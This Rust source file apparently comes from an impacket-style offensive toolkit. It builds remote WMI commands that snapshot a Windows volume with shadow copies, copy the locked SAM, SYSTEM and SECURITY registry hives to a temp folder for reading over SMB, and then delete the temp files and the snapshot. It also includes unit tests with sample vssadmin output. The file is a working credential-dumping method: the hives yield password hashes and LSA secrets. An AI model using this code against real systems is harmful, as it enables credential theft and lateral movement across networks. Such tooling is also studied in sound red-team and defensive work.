//! `shadowcopy`: Agentless Windows Volume Shadow Copy hive extraction engine.
//!
//! Uses WMI `Win32_ShadowCopy.Create()` to snapshot the system volume, then reads
//! locked registry hives (`SAM`, `SYSTEM`, `SECURITY`) directly from the shadow copy
//! path via SMB — no service creation, no `cmd.exe`, no files written to target disk.

use impacket_core::CoreError;

/// Result of a shadow copy creation via WMI.
#[derive(Debug, Clone)]
pub struct ShadowCopyInfo {
    /// Shadow copy ID (GUID format).
    pub shadow_id: String,
    /// Shadow copy device path (e.g. `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3`).
    pub device_path: String,
}

/// Parses a WMI `Win32_ShadowCopy.Create()` execution result to extract the shadow copy ID.
/// The WMI method returns: `ReturnValue = 0, ShadowID = "{GUID}"`.
pub fn parse_shadow_create_output(output: &str) -> Result<String, CoreError> {
    // Look for ShadowID in the output
    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.contains("ShadowID") || trimmed.contains("shadowid") {
            // Extract GUID between braces
            if let Some(start) = trimmed.find('{') {
                if let Some(end) = trimmed.find('}') {
                    return Ok(trimmed[start..=end].to_string());
                }
            }
        }
    }
    Err(CoreError::ProtocolError(
        "Could not parse ShadowID from Win32_ShadowCopy.Create output".into(),
    ))
}

/// Builds the WMI command string to create a volume shadow copy.
/// Returns the command that should be executed via `wmiexec` to create
/// a shadow copy and echo its ID.
pub fn build_shadow_create_command(volume: &str) -> String {
    // Use PowerShell to create shadow copy and return the ID
    // This is more reliable than WMIC which is deprecated on newer Windows
    format!(
        r#"powershell.exe -NoProfile -NonInteractive -Command "(Get-WmiObject -List Win32_ShadowCopy).Create('{}\\','ClientAccessible') | ForEach-Object {{ $_.ShadowID }}" "#,
        volume.trim_end_matches('\\')
    )
}

/// Builds the WMI command string to create a shadow copy using WMIC
/// (fallback for systems without PowerShell or older Windows).
pub fn build_shadow_create_command_wmic(volume: &str) -> String {
    format!(
        r#"cmd.exe /c wmic shadowcopy call create Volume={}\"#,
        volume.trim_end_matches('\\')
    )
}

/// Builds the WMI command to list shadow copies and find the latest one.
pub fn build_shadow_list_command() -> String {
    r#"cmd.exe /c vssadmin list shadows /for=C:\"#.to_string()
}

/// Builds the WMI command to delete a shadow copy by ID.
pub fn build_shadow_delete_command(shadow_id: &str) -> String {
    format!(
        r#"cmd.exe /c vssadmin delete shadows /Shadow={} /Quiet"#,
        shadow_id
    )
}

/// Parses `vssadmin list shadows` output to extract the device path of the latest shadow copy.
pub fn parse_shadow_list_output(output: &str) -> Result<ShadowCopyInfo, CoreError> {
    let mut last_id = String::new();
    let mut last_path = String::new();
    
    for line in output.lines() {
        let trimmed = line.trim();
        if trimmed.contains("Shadow Copy ID:") {
            if let Some(pos) = trimmed.find('{') {
                if let Some(end) = trimmed.find('}') {
                    last_id = trimmed[pos..=end].to_string();
                }
            }
        }
        if trimmed.contains("Shadow Copy Volume:") || trimmed.contains("shadow copy volume:") {
            if let Some(pos) = trimmed.find("\\\\?\\") {
                last_path = trimmed[pos..].trim().to_string();
            }
        }
    }
    
    if last_path.is_empty() {
        return Err(CoreError::ProtocolError(
            "No shadow copy volume path found in vssadmin output".into(),
        ));
    }
    
    Ok(ShadowCopyInfo {
        shadow_id: last_id,
        device_path: last_path,
    })
}

/// Constructs the UNC path to read a hive file from a shadow copy device path.
///
/// Converts shadow device path like `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\`
/// into an SMB-accessible path like `Windows\System32\config\SAM` relative to
/// the admin share (C$ or ADMIN$).
///
/// For SMB access, we use the raw device path through the `C$` share:
/// The shadow copy files are accessible at `\\server\C$\` using symlink tricks,
/// or more commonly, we copy them to a temp location. However, the cleanest
/// approach is to use `cmd.exe /c copy` from the shadow path to a temp file,
/// read it, then delete it.
pub fn build_hive_copy_command(shadow_device_path: &str, hive_name: &str, temp_token: &str) -> String {
    let shadow_path = shadow_device_path.trim_end_matches('\\');
    format!(
        r#"cmd.exe /c copy "{}\Windows\System32\config\{}" "C:\Windows\Temp\{}_{}.hive" /Y"#,
        shadow_path, hive_name, hive_name, temp_token
    )
}

/// Builds the cleanup command to delete a temporary hive file.
pub fn build_hive_cleanup_command(hive_name: &str, temp_token: &str) -> String {
    format!(
        r#"cmd.exe /c del "C:\Windows\Temp\{}_{}.hive" /F /Q"#,
        hive_name, temp_token
    )
}

/// Represents the full shadow copy extraction pipeline configuration.
#[derive(Debug, Clone)]
pub struct ShadowCopyConfig {
    /// Volume to snapshot (default: `C:\`).
    pub volume: String,
    /// Whether to also extract SECURITY hive for LSA secrets.
    pub dump_security: bool,
    /// Random token for temp file naming.
    pub temp_token: String,
}

impl Default for ShadowCopyConfig {
    fn default() -> Self {
        Self {
            volume: r"C:\".to_string(),
            dump_security: false,
            temp_token: String::new(),
        }
    }
}

/// Pipeline steps for shadow copy extraction, returned as command strings
/// to be executed sequentially via `wmiexec`.
///
/// Steps:
/// 1. Create shadow copy
/// 2. List shadows to get device path  
/// 3. Copy hive files from shadow to temp
/// 4. (Caller reads temp files via SMB)
/// 5. Delete temp files
/// 6. Delete shadow copy
pub fn build_extraction_pipeline(config: &ShadowCopyConfig) -> Vec<(String, &'static str)> {
    let mut steps = Vec::new();
    
    // Step 1: Create shadow copy
    steps.push((
        build_shadow_create_command_wmic(&config.volume),
        "create_shadow",
    ));
    
    // Step 2: List shadows to get device path
    steps.push((
        build_shadow_list_command(),
        "list_shadows",
    ));
    
    // Steps 3: Copy hive files
    // These will be filled in after we know the device path.
    // Placeholder — the caller must insert copy commands here.
    
    steps
}

/// Returns the list of hive names to extract based on configuration.
pub fn hive_names(dump_security: bool) -> Vec<&'static str> {
    if dump_security {
        vec!["SYSTEM", "SAM", "SECURITY"]
    } else {
        vec!["SYSTEM", "SAM"]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_shadow_list_output() {
        let output = r#"
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
   Contained 1 shadow copies at creation time: 11/13/2026 2:30:00 PM
      Shadow Copy ID: {deadbeef-1234-5678-9abc-def012345678}
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
"#;
        let info = parse_shadow_list_output(output).unwrap();
        assert_eq!(info.shadow_id, "{deadbeef-1234-5678-9abc-def012345678}");
        assert!(info.device_path.contains("HarddiskVolumeShadowCopy3"));
    }

    #[test]
    fn test_build_hive_copy_command() {
        let cmd = build_hive_copy_command(
            r"\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3",
            "SAM",
            "abc123",
        );
        assert!(cmd.contains("HarddiskVolumeShadowCopy3"));
        assert!(cmd.contains("SAM"));
        assert!(cmd.contains("abc123"));
    }

    #[test]
    fn test_build_shadow_commands() {
        let create = build_shadow_create_command_wmic(r"C:\");
        assert!(create.contains("wmic"));
        assert!(create.contains("shadowcopy"));

        let delete = build_shadow_delete_command("{deadbeef-1234-5678-9abc-def012345678}");
        assert!(delete.contains("vssadmin"));
        assert!(delete.contains("deadbeef"));

        let list = build_shadow_list_command();
        assert!(list.contains("vssadmin"));
    }

    #[test]
    fn test_hive_names() {
        assert_eq!(hive_names(false), vec!["SYSTEM", "SAM"]);
        assert_eq!(hive_names(true), vec!["SYSTEM", "SAM", "SECURITY"]);
    }

    #[test]
    fn test_shadow_copy_config_default() {
        let cfg = ShadowCopyConfig::default();
        assert_eq!(cfg.volume, r"C:\");
        assert!(!cfg.dump_security);
    }
}
